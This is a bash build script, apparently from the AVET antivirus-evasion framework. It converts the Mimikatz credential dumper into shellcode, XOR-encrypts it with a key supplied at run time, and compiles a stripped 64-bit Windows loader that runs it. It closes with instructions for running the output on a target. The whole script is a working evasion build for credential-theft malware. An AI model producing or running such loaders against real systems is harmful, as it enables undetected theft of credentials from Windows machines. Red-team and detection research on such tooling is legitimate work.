#!/bin/bash


#DESCRIPTION_START
# Example script that uses an executable file as input, here Mimikatz.
# Converts the exe to shellcode using the pe_to_shellcode tool by Hasherezade:
# https://github.com/hasherezade/pe_to_shellcode
#
# This script expects the Mimikatz executable to be at input/mimikatz.exe
# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
# Executes the executable as 64-bit shellcode.
# Applied XOR encryption with a dynamic key, provided from the command line at run time.
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no preexec command
set_command_source no_data
set_command_exec no_command
# generate key file
generate_key preset aabbccddee input/key_raw.txt
# enable debug print
enable_debug_print
#CONFIGURATION_END


# convert mimikatz executable into shellcode format
wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/mimikatz.exe.shc

# encode mimikatz shellcode
encode_payload xor input/mimikatz.exe.shc input/mimikatz_enc_raw.txt input/key_raw.txt

# convert raw shellcode into c format for static include
./tools/data_raw_to_c/data_raw_to_c input/mimikatz_enc_raw.txt input/mimikatz_enc_c.txt buf

# set shellcode source
set_payload_source static_from_file input/mimikatz_enc_c.txt

# setting to retrieve the decryption key dynamically from command line in format "aabbccddee"
set_key_source from_command_line_hex

# set payload info source: not needed
set_payload_info_source no_data

# specify XOR decoding
set_decoder xor

# select 64-bit shellcode binding technique
set_payload_execution_method exec_shellcode64

# compile final payload
$win64_compiler -o output/mimikatz_pe2shc_xorfromcmd_win64.exe source/avet.c
strip output/mimikatz_pe2shc_xorfromcmd_win64.exe

# cleanup
cleanup_techniques


echo "
# The decryption key is aabbccddee if it has not been changed.
# You need to provide the decryption key as 2nd command line argument.
# Call generated executable on target like:
# $ mimikatz_pe2shc_xorfromcmd_win64.exe [your mimikatz arguments, probably 'coffee'] [decryption key]
"